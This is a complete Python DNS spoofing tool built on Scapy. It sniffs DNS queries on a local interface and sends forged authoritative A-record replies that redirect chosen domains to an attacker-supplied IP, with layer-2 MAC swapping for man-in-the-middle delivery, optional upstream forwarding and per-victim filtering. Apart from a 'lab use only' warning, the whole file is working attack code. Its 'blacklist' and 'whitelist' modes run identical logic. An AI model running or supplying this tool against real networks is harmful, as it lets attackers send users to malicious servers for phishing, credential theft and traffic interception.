#!/usr/bin/env python3
"""
dns_spoof.py

Lightweight DNS spoofing responder for lab use.

Features:
 - Sniffs DNS queries on the local interface and replies with attacker-controlled IPs
 - Preserves DNS transaction ID and flags
 - Selective mode: whitelist (only spoof listed names) OR blacklist (spoof listed names)
 - Optional forwarding of non-targeted queries to an upstream resolver
 - Graceful shutdown on SIGINT/SIGTERM

Usage examples:
 # basic - spoof example.com to attacker IP 192.168.128.2 (blacklist mode)
 sudo python3 dns_spoof.py --iface eth0 --targets config/targets.txt \
         --attacker-ip 192.168.128.2 --mode blacklist --verbose

 # whitelist mode: only spoof domains listed in targets.txt, forward others to 192.168.128.4
 sudo python3 dns_spoof.py --iface eth0 --targets config/targets.txt \
         --attacker-ip 192.168.128.2 --mode whitelist --forward 192.168.128.4

targets file format:
 # one domain per line, comments with # trimmed and blank lines ignored
 example.com
 spoofed.local

WARNING: Use only in a lab you control.
"""

import argparse
import socket
import threading
import signal
import sys
import time
from pathlib import Path

# IMPORTANT: Import sendp() along with send()
from scapy.all import sniff, UDP, IP, DNS, DNSQR, DNSRR, send, sendp, Raw, Ether

# ---------- Globals ----------
STOP = False

# ---------- Helpers ----------
def load_targets(path):
    targets = set()
    for line in Path(path).read_text().splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        # normalize domain names to lower and without trailing dot
        targets.add(line.rstrip('.').lower())
    return targets

def domain_matches(qname, targets):
    """Return canonical domain names to check match in a simple suffix-matching manner
        e.g. 'www.example.com' matches 'example.com' in list"""
    if not qname:
        return None
    q = qname.lower().rstrip('.')
    # direct match
    if q in targets:
        return q
    # check suffix match: 'sub.example.com' -> matches 'example.com'
    parts = q.split('.')
    for i in range(1, len(parts)):
        suffix = '.'.join(parts[i:])
        if suffix in targets:
            return suffix
    return None

# ---------- DNS reply builder ----------
def build_spoof_response(pkt, spoof_ip):
    """
    Build the DNS response layers (L3 and L4, L7) mirroring the original transaction ID
    and setting an answer with spoof_ip.
    """
    ip = pkt[IP]
    udp = pkt[UDP]
    dns = pkt[DNS]

    # create DNS answer (A record)
    qname = dns.qd.qname if dns.qd else b''
    # preserve ID and some flags; set QR=1 (response), AA=1 (auth answer)
    resp_dns = DNS(
        id=dns.id,
        qr=1,      # response
        aa=1,      # authoritative
        rd=dns.rd, # recursion desired from original
        ra=1,      # recursion available (set to 1 for compatibility)
        qd=dns.qd,
        ancount=1,
        an=DNSRR(rrname=qname, type='A', rclass='IN', ttl=300, rdata=spoof_ip)
    )

    # L3/L4 response layers (IP source/destination are swapped)
    reply = IP(dst=ip.src, src=ip.dst)/UDP(dport=udp.sport, sport=udp.dport)/resp_dns
    return reply

# ---------- Forward query helper ----------
def forward_and_reply(pkt, upstream, iface, verbose=False):
    """
    Forward the incoming DNS query to upstream server and relay the response back to the querier.
    Uses a simple UDP socket to query upstream and send raw reply packet at L2 (sendp).
    """
    ip = pkt[IP]
    udp = pkt[UDP]
    dns = pkt[DNS]
    qbytes = bytes(dns)  # DNS layer bytes (includes transaction id and qd)

    if not pkt.haslayer(Ether):
        if verbose:
            print("[-] WARNING: Ethernet layer information missing. Cannot relay response at L2.")
        return

    # create a socket to the upstream resolver
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2.0)
            s.sendto(qbytes, (upstream, 53))
            data, _ = s.recvfrom(4096)
            
            # Craft L2/L3/L4 outer layers and send back via Scapy sendp()
            resp_ip = IP(dst=ip.src, src=ip.dst)
            resp_udp = UDP(dport=udp.sport, sport=udp.dport)
            
            # Swap MACs: Dst MAC = Original Src MAC (Victim), Src MAC = Original Dst MAC (Attacker/Interface)
            resp_eth = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)

            resp_pkt = resp_eth / resp_ip / resp_udp / Raw(load=data)
            
            # Use sendp() for L2 sending
            sendp(resp_pkt, iface=iface, verbose=0)
            
            if verbose:
                print(f"[+] Forwarded query for {dns.qd.qname.decode()} to {upstream} and relayed response")
    except Exception as e:
        if verbose:
            print(f"[-] Forwarding failed: {e}")

# ---------- Packet callback ----------
def dns_callback(pkt, args):
    """
    Callback for sniffed UDP/53 packets.
    """
    # ensure this is a DNS query packet AND has the Ethernet layer for L2 spoofing
    if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR) or not pkt.haslayer(Ether):
        return

    dns = pkt[DNS]
    qname = dns.qd.qname.decode() if dns.qd and dns.qd.qname else ''
    qname_norm = qname.rstrip('.').lower()
    attacker_ip = args.attacker_ip
    mode = args.mode
    targets = args.targets
    verbose = args.verbose
    upstream = args.forward

    # filter by source IP if user specified victim-only mode
    if args.victim_ip:
        if pkt[IP].src != args.victim_ip:
            return

    matched = domain_matches(qname, targets)
    do_spoof = False
    
    if mode == 'blacklist':
        # spoof if domain is in targets
        do_spoof = bool(matched)
    else: # whitelist
        # spoof only if domain is in targets
        do_spoof = bool(matched)

    # --- Handling Non-Targeted Queries ---
    if mode == 'blacklist' and not do_spoof:
        # not in blacklist => forward or ignore
        if upstream:
            if verbose:
                print(f"[=] Non-target (not blacklisted): {qname} -> forwarding to upstream")
            forward_and_reply(pkt, upstream, args.iface, verbose=verbose)
        else:
            if verbose:
                print(f"[ ] Non-target (not blacklisted): {qname} -> ignoring")
        return

    if mode == 'whitelist' and not do_spoof:
        # not in whitelist => forward or ignore
        if upstream:
            if verbose:
                print(f"[=] Not whitelisted: {qname} -> forwarding to upstream")
            forward_and_reply(pkt, upstream, args.iface, verbose=verbose)
        else:
            if verbose:
                print(f"[ ] Not whitelisted: {qname} -> ignoring")
        return

    # --- Handling Targeted Queries (Spoof) ---
    # If we reach here we should spoof (either matched or policy)
    try:
        dst_ip = attacker_ip
        if verbose:
            print(f"[!] Spoofing DNS for {qname} -> {dst_ip} (matched: {matched})")
            
        # 1. Build L3/L4/L7 response (IP/UDP/DNS)
        reply_l3 = build_spoof_response(pkt, dst_ip)
        
        # 2. Add the L2 (Ethernet) layer for sendp()
        # Swap MACs: Dst MAC = Original Src MAC (Victim), Src MAC = Original Dst MAC (Attacker/Interface)
        resp_eth = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
        
        # Combine L2 with L3/L4/L7
        final_reply = resp_eth / reply_l3
        
        # 3. Use sendp() for Layer 2 sending (required for MitM transparency)
        sendp(final_reply, iface=args.iface, verbose=0)
        
        if verbose:
            print(f"[+] Sent spoofed DNS response for {qname} to {pkt[IP].src}")
    except Exception as e:
        if verbose:
            print(f"[-] Failed to send spoof response: {e}")


# ---------- Main entry ----------
def main():
    global STOP
    parser = argparse.ArgumentParser(description="dns_spoof.py - lab use only")
    parser.add_argument('--iface', required=True, help='Interface to sniff on (e.g. eth0)')
    parser.add_argument('--targets', required=True, help='Path to targets file (one domain per line)')
    parser.add_argument('--attacker-ip', required=True, help='IP address to return in spoofed A records')
    parser.add_argument('--mode', choices=['blacklist', 'whitelist'], default='blacklist',
                        help='blacklist: spoof listed domains; whitelist: only spoof those listed')
    parser.add_argument('--forward', help='Optional upstream DNS server (IP) to forward non-targeted queries')
    parser.add_argument('--victim-ip', help='Optional: only intercept queries from this source IP')
    
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    args = parser.parse_args()

    args.targets = load_targets(args.targets)
    if not args.targets:
        print("[-] Targets list empty or missing. Exiting.")
        sys.exit(1)

    print("[*] DNS spoof starting (lab only). Press Ctrl+C to stop.")
    if args.verbose:
        print(f"[*] Mode: {args.mode}, attacker_ip: {args.attacker_ip}, iface: {args.iface}")
        print(f"[*] Loaded targets: {args.targets}")
        if args.forward:
            print(f"[*] Upstream forwarder: {args.forward}")

    # sniff DNS queries on UDP/53
    bpf = "udp dst port 53"
    if args.victim_ip:
        bpf = f"udp dst port 53 and src host {args.victim_ip}"

    # handle Ctrl+C
    def _handle_sigint(signum, frame):
        nonlocal args
        print("\n[!] Caught signal, stopping...")
        global STOP
        STOP = True
    signal.signal(signal.SIGINT, _handle_sigint)
    signal.signal(signal.SIGTERM, _handle_sigint)

    try:
        print("[*] Starting sniffing loop...")
        while not STOP:
            sniff(filter=bpf, prn=lambda p: dns_callback(p, args), iface=args.iface, store=0, timeout=1) 
            
    except Exception as e:
        print(f"[-] Sniffing error: {e}")
    finally:
        print("[*] Stopped sniffing. Exiting.")

if __name__ == "__main__":
    main()
